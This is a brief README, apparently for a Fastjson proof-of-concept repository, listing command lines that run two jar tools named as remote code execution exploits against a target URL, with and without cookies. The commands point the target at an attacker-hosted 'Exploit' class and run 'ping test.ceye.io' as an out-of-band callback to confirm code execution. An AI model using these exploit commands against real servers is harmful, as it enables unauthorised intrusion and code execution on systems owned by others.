# Fastjson-POC
Fastjson-POC

# 有cookies

java -jar fastjson-2019-Rce.jar http://url/ xxx.xxx.xxx.xxx/Exploit cookies

java -jar fast-2018-Rce.jar http://url/ cookies "ping test.ceye.io"


# 无cookies

java -jar fastjson-2019-Rce.jar http://url/ xxx.xxx.xxx.xxx/Exploit null

java -jar fast-2018-Rce.jar http://url/ null "ping test.ceye.io"
